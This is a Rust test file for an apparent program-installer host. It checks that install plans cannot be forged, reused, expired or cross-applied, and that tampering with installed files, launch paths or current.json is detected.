    let fabricated = InstallPlan::new(Action::Uninstall, None);
    let error = s
        .programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &fabricated,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("refused");
    assert!(format!("{error}").contains("no such plan"), "{error}");
    assert!(
        current(&s).is_some(),
        "a copy removed by a plan nobody made"
    );
    let removed = install(&s, None, Action::Uninstall).expect("a planned uninstall");
    assert!(removed.is_none());
    assert!(current(&s).is_none());
}

#[test]
fn a_failed_install_that_declared_a_change_says_the_change_is_left_behind() {
    let s = setup("leftbehind", Variant::Normal);
    let error =
        apply_rigged(&s, rigged(&s, Rig::WritesDeclaredThenFails), |_| {}).expect_err("failed");
    let text = format!("{error}");
    assert!(
        text.contains("left behind") && text.contains(".bashrc"),
        "{text}"
    );
}

#[test]
fn a_writer_that_outlives_the_apply_is_caught_in_the_settle_window() {
    let s = setup("linger", Variant::Normal);
    let mut options = Options::default();
    options.home = Some(s.dir.0.join("home"));
    options.watch_registry = false;
    options.allow_elevated = true;
    options.settle = std::time::Duration::from_millis(1500);
    let programs = Programs::unchecked_for_tests(&s, options);
    let s = Setup { programs, ..s };
    let error = apply_rigged(&s, rigged(&s, Rig::LingersThenWrites), |_| {}).expect_err("caught");
    assert!(matches!(error, StoreError::Undeclared { .. }), "{error}");
}

#[test]
fn a_plan_is_applied_once() {
    let s = setup("once", Variant::Normal);
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let plan = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    let apply = |plan: &InstallPlan| {
        s.programs.apply(
            "echo_store",
            &StoreSettings::default(),
            plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
    };
    apply(&plan).expect("the first time");
    let error = apply(&plan).expect_err("the second");
    assert!(format!("{error}").contains("no such plan"), "{error}");
}

#[test]
fn an_old_install_plan_cannot_put_an_older_version_over_a_newer_copy() {
    let s = setup("stale", Variant::Normal);
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let old = s
        .programs
        .plan(
            "echo_store",
            &*store,
            Action::Install,
            None,
            Some("1.0.0".to_owned()),
        )
        .expect("plan");
    install(&s, None, Action::Install)
        .expect("2.0.0")
        .expect("applied");
    let error = s
        .programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &old,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("stale");
    assert!(format!("{error}").contains("plan again"), "{error}");
    assert_eq!(current(&s).expect("still").version, "2.0.0");
}

#[test]
fn the_launch_must_lie_inside_the_copy_and_current_json_must_be_the_one_the_host_wrote() {
    let s = setup("launchguard", Variant::Normal);
    install(&s, None, Action::Install)
        .expect("installed")
        .expect("applied");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    s.programs.launch(&*store).expect("untouched");
    let json = s.dir.0.join("programs/echo/current.json");
    let original = fs::read_to_string(&json).expect("current.json");
    // A launch that points at a program elsewhere.
    let elsewhere = s.dir.0.join("elsewhere.exe");
    fs::write(&elsewhere, b"x").expect("a file");
    let current = current(&s).expect("current");
    let edited = original.replace(
        &current.launch.path.replace('\\', "\\\\"),
        &elsewhere.to_string_lossy().replace('\\', "\\\\"),
    );
    assert_ne!(
        edited, original,
        "the launch path was found in current.json"
    );
    fs::write(&json, &edited).expect("tamper");
    assert!(
        s.programs.launch(&*store).is_err(),
        "a launch outside the copy was handed out"
    );
    // Any other edit of the file changes its digest, which the host keeps elsewhere.
    fs::write(
        &json,
        original.replace("\"version\": \"2.0.0\"", "\"version\": \"9.9.9\""),
    )
    .expect("tamper");
    assert!(
        s.programs.launch(&*store).is_err(),
        "a changed current.json was trusted"
    );
    fs::write(&json, &original).expect("restore");
    s.programs.launch(&*store).expect("as the host wrote it");
}

#[test]
fn a_rollback_keeps_the_records_of_the_copy_it_returns_to() {
    let s = setup("rollbackrecords", Variant::Normal);
    install(&s, Some("1.0.0"), Action::Install)
        .expect("1.0.0")
        .expect("applied");
    install(&s, None, Action::Update)
        .expect("2.0.0")
        .expect("applied");
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    s.programs.rollback(&*store).expect("rolled back");
    let launch = s.programs.launch(&*store).expect("the old copy, untouched");
    let mut bytes = fs::read(&launch.path).expect("the program");
    bytes.push(1);
    fs::write(&launch.path, bytes).expect("tamper");
    assert!(
        s.programs.launch(&*store).is_err(),
        "a rolled-back copy lost its records"
    );
}

#[test]
fn files_unpacked_from_an_archive_are_recorded_and_so_are_the_ones_added_later() {
    let dir = Dir::new("archive");
    let home = dir.0.join("home");
    fs::create_dir_all(&home).expect("home");
    let fixture = EchoFixture {
        standin: standin(),
        archive: true,
    };
    let transport = WorldTransport::new(fixture.world(Variant::Normal));
    let mut options = Options::default();
    options.home = Some(home);
    options.watch_registry = false;
    options.settle = std::time::Duration::from_millis(100);
    options.allow_elevated = true;
    let programs = Programs::new(Shelf::unchecked(dir.0.join("programs")), registry())
        .transport(transport)
        .options(options);
    let settings = StoreSettings::default();
    let store = programs
        .store("echo_archive_store", &settings)
        .expect("store");
    let plan = programs
        .plan("echo_archive_store", &*store, Action::Install, None, None)
        .expect("plan");
    programs
        .apply(
            "echo_archive_store",
            &settings,
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect("installed");
    programs.launch(&*store).expect("untouched");
    let readme = dir.0.join("programs/echo-archive/versions");
    let version = fs::read_dir(&readme)
        .expect("versions")
        .flatten()
        .next()
        .expect("a version")
        .path();
    let data = version.join("app/data/readme.txt");
    fs::write(&data, b"changed").expect("tamper");
    assert!(
        programs.launch(&*store).is_err(),
        "an unpacked file changed unseen"
    );
    fs::write(&data, b"echo\n").expect("restore");
    programs.launch(&*store).expect("as installed");
    fs::write(version.join("app/data/added.txt"), b"new").expect("add");
    assert!(programs.launch(&*store).is_err(), "a file was added unseen");
}

#[test]
fn the_apply_lock_lets_one_install_run_at_a_time() {
    let s = setup("applylock", Variant::Normal);
    let held = s.programs.shelf().apply_lock().expect("the first");
    assert!(matches!(
        s.programs.shelf().apply_lock(),
        Err(canoa_host::store::shelf::ShelfError::Held)
    ));
    let error = install(&s, None, Action::Install).expect_err("refused while another install runs");
    assert!(format!("{error}").contains("holds"), "{error}");
    drop(held);
    install(&s, None, Action::Install)
        .expect("after it")
        .expect("applied");
}

#[test]
fn a_plan_that_has_expired_or_was_pushed_out_is_not_applied() {
    let s = setup("expiry", Variant::Normal);
    let mut options = Options::default();
    options.home = Some(s.dir.0.join("home"));
    options.watch_registry = false;
    options.allow_elevated = true;
    options.settle = std::time::Duration::from_millis(50);
    options.plan_ttl = std::time::Duration::from_millis(200);
    options.plan_limit = 2;
    let programs = Programs::unchecked_for_tests(&s, options);
    let store = programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let first = programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    std::thread::sleep(std::time::Duration::from_millis(400));
    let error = programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &first,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("expired");
    assert!(format!("{error}").contains("no such plan"), "{error}");
    let a = programs
        .plan(
            "echo_store",
            &*store,
            Action::Install,
            None,
            Some("1.0.0".to_owned()),
        )
        .expect("a");
    let _b = programs
        .plan(
            "other_one",
            &*store,
            Action::Install,
            None,
            Some("2.0.0".to_owned()),
        )
        .expect("b");
    let _c = programs
        .plan("other_two", &*store, Action::Install, None, None)
        .expect("c");
    let error = programs
        .apply(
            "echo_store",
            &StoreSettings::default(),
            &a,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("pushed out");
    assert!(format!("{error}").contains("no such plan"), "{error}");
}

#[test]
fn a_plan_is_good_for_the_provider_that_made_it_only() {
    let s = setup("provider", Variant::Normal);
    let store = s
        .programs
        .store("echo_store", &StoreSettings::default())
        .expect("store");
    let plan = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("plan");
    let error = s
        .programs
        .apply(
            "echo_archive_store",
            &StoreSettings::default(),
            &plan,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("another provider's");
    assert!(format!("{error}").contains("no such plan"), "{error}");
}

#[test]
fn the_user_path_is_not_a_registry_key_a_plan_may_declare() {
    let s = setup("regpath", Variant::Normal);
    let error = apply_rigged(
        &s,
        rigged(
            &s,
            Rig::DeclaresRegistry(r"HKCU\Environment\Path".to_owned()),
        ),
        |_| {},
    )
    .expect_err("refused");
    assert!(format!("{error}").contains("declares"), "{error}");
}

#[test]
fn a_plan_made_only_to_be_read_is_not_kept_and_does_not_replace_the_one_the_owner_holds() {
    let s = setup("plan-to-read", Variant::Normal);
    let settings = StoreSettings::default();
    let store = s.programs.store("echo_store", &settings).expect("store");
    let kept = s
        .programs
        .plan("echo_store", &*store, Action::Install, None, None)
        .expect("the owner's plan");
    // The same plan asked for again to be read has the same token; it must not replace or remove the kept one.
    let read = s
        .programs
        .plan_to_read("echo_store", &*store, Action::Install, None, None)
        .expect("a plan to read");
    assert_eq!(read.token, kept.token);
    let applied = s
        .programs
        .apply(
            "echo_store",
            &settings,
            &kept,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect("the owner's plan is still there")
        .expect("applied");
    assert_eq!(applied.current.version, "2.0.0");
    // And a plan made only to be read cannot be applied at all.
    let lone = setup("plan-to-read-alone", Variant::Normal);
    let store = lone.programs.store("echo_store", &settings).expect("store");
    let read = lone
        .programs
        .plan_to_read("echo_store", &*store, Action::Install, None, None)
        .expect("a plan to read");
    let refused = lone
        .programs
        .apply(
            "echo_store",
            &settings,
            &read,
            Arc::new(Recorder::default()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect_err("not held");
    assert!(
        format!("{refused}").contains("made no such plan"),
        "{refused}"
    );
}
